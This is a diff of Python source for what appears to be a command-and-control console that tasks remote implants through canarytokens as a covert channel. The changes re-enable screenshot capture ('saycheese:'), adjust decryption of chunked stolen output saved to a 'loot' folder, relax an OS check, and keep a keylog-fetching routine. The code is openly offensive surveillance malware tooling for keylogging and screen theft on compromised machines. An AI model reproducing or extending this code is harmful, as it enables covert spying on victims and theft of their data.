@@ -46,11 +46,11 @@ chunkedlen = 0
 screenshotdone = False
 ps = False
 waitForKeys = False
-lootpath = ""
+lootpath = "loot/template"
 requestedfile = ""
 trackingString = ""
 encrypted = True
-BLOCK_SIZE = 32
+BLOCK_SIZE = 128
 
 #---------------Change Me---------------#
 #-----------b'<32 length key>-----------#
@@ -67,8 +67,7 @@ def encrypt(message):
             return (encrypteddataunhex)
 
         except Exception as e:
-            print(Fore.RED + "[-] " + Fore.RESET + " Encryption error: " + str(e))
-            pass
+            return ("Encryption Error")
     else:
         return message
 
@@ -82,21 +81,16 @@ def decrypt(encrypteddata):
             return unpad(msg_dec, BLOCK_SIZE)
 
         except Exception as e:
-            print(Fore.RED + "[-] " + Fore.RESET + " Decryption error: " + str(e))
-            print(e)
-            exc_type, exc_obj, exc_tb = sys.exc_info()
-            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            print(exc_type, fname, exc_tb.tb_lineno)
-            pass
+            return ("Decryption Error")
+
     else:
         return encrypteddata
 
 
 def generate_canarytoken():
     # Check if template loot dir exists. If not, create it
-    # lootdir = os.path.dirname(lootpath)
-    # if not os.path.exists(lootdir):
-    #    os.makedirs(lootdir)
+    if not os.path.exists(lootpath):
+        os.makedirs(lootpath)
 
     stripedUA = ua.random
 
@@ -217,7 +211,7 @@ def getResults(lastdictsize):
 
         if len(reslist) > 45:
             print(Fore.BLUE + "\n[!]" + Fore.RESET + " Too many alerts for this token!")
-            print(Fore.BLUE + "[!]" + Fore.RESET + " Rerun last command after reconnection...")
+            print(Fore.BLUE + "[!]" + Fore.RESET + " Try to rerun last command after reconnection...")
             time.sleep(5)
             fallback()
             return 1
@@ -278,11 +272,9 @@ def getResults(lastdictsize):
                     for q in holder:
                         stringbuilder+=q
 
-                    stringbuilder = base64.b64decode(decrypt(stringbuilder)).decode('utf-8')
-
-                    decodedlist.append(stringbuilder)
-                    # Need to sleep for large requests
                     time.sleep(1)
+                    stringbuilder = base64.b64decode(decrypt(stringbuilder)).decode('utf-8')
+                    decodedlist.append(stringbuilder)
                     doneChunked = True
                     stringbuilder = stringbuilder.replace("res:", "")
 
@@ -341,8 +333,8 @@ def getResults(lastdictsize):
                     decodedlist.append(stringbuilder)
                     # Need to sleep for large requests
                     time.sleep(1)
-                    #print(decodedlist[-1])
                     doneChunked = True
+                    # TOFIX:
                     imgbytes = base64.b64decode(decrypt(decodedlist[-1]))
                     timestr = time.strftime("%Y%m%d-%H%M%S")
 
@@ -665,15 +657,6 @@ def serverExit():
         sys.exit(1)
 
 
-def animate():
-    for c in itertools.cycle(
-            [Fore.BLUE + '[|]' + Fore.RESET + ' loading   ', Fore.BLUE + '[/]' + Fore.RESET + ' loading.  ',
-             Fore.BLUE + '[-]' + Fore.RESET + ' loading.. ', Fore.BLUE + '[\\]' + Fore.RESET + ' loading...']):
-        if done:
-            break
-        sys.stdout.write('\r' + c)
-        sys.stdout.flush()
-        time.sleep(0.25)
 
 def checkKey():
     if len(key.decode()) != 32:
@@ -689,8 +672,7 @@ def main():
     currentOS = platform.system()
     if currentOS != "Windows":
         print(
-            Fore.RED + "\n[-]" + Fore.RESET + " As of now, must be ran on Windows. Sorry :(... Current OS: " + currentOS + "\n")
-        sys.exit(1)
+            Fore.RED + "\n[-]" + Fore.RESET + " Warning: Not sure why this is unstable on *nix. Sorry :( ...\n")
 
     checkKey()
     global lastdictsize
@@ -862,15 +844,13 @@ def main():
 
                 elif cmd.lower() == "screenshot":
                     if connected:
-                        print("TOFIX")
-                        """
                         print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
                         fallback()
                         time.sleep(1)
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
                         taskCommand("saycheese:")
                         lastdictsize = getResults(lastdictsize)
-                        """
+
                     else:
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
@@ -1023,6 +1003,8 @@ def main():
 
 
 
+
+
 # Animations ############################################################################################################
 def chunkAnimate():
     for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Rebuilding Output   ',
@@ -1054,6 +1036,17 @@ def animateFetchKeylog():
                               Fore.BLUE + '[-]' + Fore.RESET + ' Requesting Keystrokes.. ',
                               Fore.BLUE + '[\\]' + Fore.RESET + ' Requesting Keystrokes...']):
         if waitForKeys:
+            break
+        sys.stdout.write('\r' + c)
+        sys.stdout.flush()
+        time.sleep(0.25)
+
+
+def animate():
+    for c in itertools.cycle(
+            [Fore.BLUE + '[|]' + Fore.RESET + ' loading   ', Fore.BLUE + '[/]' + Fore.RESET + ' loading.  ',
+             Fore.BLUE + '[-]' + Fore.RESET + ' loading.. ', Fore.BLUE + '[\\]' + Fore.RESET + ' loading...']):
+        if done:
             break
         sys.stdout.write('\r' + c)
         sys.stdout.flush()
